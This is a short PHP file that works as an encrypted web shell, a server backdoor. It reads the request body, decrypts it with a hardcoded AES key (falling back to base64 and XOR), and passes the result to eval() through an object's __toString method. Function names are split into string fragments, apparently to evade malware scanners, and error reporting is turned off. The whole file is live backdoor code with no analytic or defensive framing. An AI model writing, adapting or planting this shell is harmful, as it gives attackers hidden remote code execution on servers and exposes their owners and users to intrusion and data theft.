<?php
@error_reporting(0);

session_start();

    $key="cb4c36eea57ec692"; 

        $_SESSION['k']=$key;
		
		$m="file_"."get_contents";
		
		function input_post(){
		return "php://input";
		}
		
		function base64_func(){
			return "base64_";
		}
		
		function base64_func1(){
			return "decode";
		}
		
		function open_ssl(){
			return "openssl";
		}

        $post=$m(input_post());


        if(!extension_loaded(open_ssl()))
        {
                $t=base64_func().base64_func1();

                $post=$t($post."");
                
                for($i=0;$i<strlen($post);$i++) {
							$j = $key[$i+1&15];
                             $post[$i] = $post[$i]^$j; 
                            }
        }
        
        else
        {
                $post=openssl_decrypt($post, "AES128", $key);
        }
        
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
        class C{
        	public $data;
        	public function __toString() {eval($this->data."");}}
    $obj = new C();
    $obj->data = $post;
    $obj.'test';
?>